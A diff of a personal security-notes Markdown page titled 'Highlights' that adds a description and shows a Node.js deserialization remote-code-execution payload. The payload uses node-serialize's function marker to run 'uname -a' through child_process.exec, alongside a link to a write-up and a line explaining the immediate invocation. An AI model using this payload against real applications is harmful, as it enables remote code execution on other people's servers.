@@ -2,18 +2,20 @@
 title: "Highlights"
 date: 2020-01-03T20:06:24-05:00
 draft: false
+description: "Node.js deserialization exploit | Fully Interactive TTY | Nano Escape | Python RCE"
 ---
 
-# Node.js deserialization exploit
+# Node.js deserialization exploit  
 
-https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/  
 
 ```js
 {"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec  
 ('uname -a', function(error, stdout, stderr)  
 { console.log(stdout) });  \n }  
 ()"}  
-```
+```  
+
 
 In this case the () is javascripts way of immediate function invokation, the first part of the code will build the function. 
 
